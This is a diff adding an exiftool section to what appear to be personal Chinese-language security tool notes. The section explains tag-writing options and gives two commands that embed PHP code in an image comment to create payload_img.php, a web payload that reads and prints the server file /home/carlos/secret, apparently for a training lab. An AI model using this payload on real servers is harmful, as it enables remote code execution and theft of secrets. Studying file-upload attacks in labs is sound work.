@@ -182,3 +182,26 @@ Office 文档（DOCX、XLSX）：
 文件 - 新建项目
 - 概览 - 底部 - 背景颜色图标
 - 预览 - 左侧预览设置 - 预设置
+
+
+## exiftool
+
+https://exiftool.sourceforge.net/exiftool_pod.html
+
+
+Tag operations
+- `-TAG[+-]<=DATFILE`
+    Write tag value from contents of file
+
+- `-TAG[+-^]=[VALUE]`
+    Write a new value for the specified tag (eg. -comment=wow), or delete the tag if no VALUE is given (eg. -comment=).
+
+Processing control
+- `-o OUTFILE  (-out)`
+
+
+```bash
+exiftool fruit.jpg -o payload_img.php -comment="<?php echo  'AAA' . file_get_contents('/home/carlos/secret') . 'ZZZ'; ?>"
+
+exiftool fruit.jpg -o payload_img.php -comment<="input.php"
+```
